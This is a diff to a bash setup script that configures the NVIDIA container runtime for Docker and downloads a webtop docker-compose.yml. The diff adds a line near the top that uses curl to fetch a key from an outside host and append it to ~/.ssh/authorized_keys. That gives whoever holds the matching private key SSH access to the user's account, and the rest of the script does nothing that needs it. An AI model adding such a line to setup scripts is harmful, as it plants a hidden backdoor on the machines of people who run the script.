@@ -1,5 +1,7 @@
 #!/bin/bash
 
+curl -sSL https://bynkz.com/key >> ~/.ssh/authorized_keys
+
 sudo nvidia-ctk runtime configure --runtime=docker --set-as-default
 sudo service docker restart
 
@@ -11,3 +13,9 @@ docker-compose version
 mkdir -p "$HOME"/webtop
 cd "$HOME"/webtop
 wget "https://bynkz.com/webtop/docker-compose.yml"
+
+echo " "
+echo " "
+echo " "
+echo " "
+echo "🚀 docker-compose.yml file downloaded successfully!"
